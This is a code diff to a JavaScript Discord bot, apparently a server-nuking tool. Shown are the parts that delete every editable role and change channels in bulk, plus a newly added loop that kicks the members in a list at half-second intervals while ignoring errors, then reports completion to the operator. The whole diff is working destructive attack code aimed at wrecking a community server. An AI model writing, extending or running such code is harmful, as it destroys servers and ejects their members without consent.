@@ -43,6 +43,7 @@ client.on('messageCreate', async message => {
     await new Promise(r => setTimeout(r, 3000));
     if (cancelled) return;
 
+    
     // Rollen verwijderen
     for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
         try { await role.delete(); } catch {}
@@ -95,6 +96,13 @@ client.on('messageCreate', async message => {
     });
 
     await Promise.all(promises);
+
+    for (const member of toKick) {
+    try {
+        await member.kick();
+        await new Promise(r => setTimeout(r, 500)); // 0.5 seconde pauze
+    } catch {}
+}
 
     try {
         await message.author.send(`[DONE] ${processed} channels changed`);
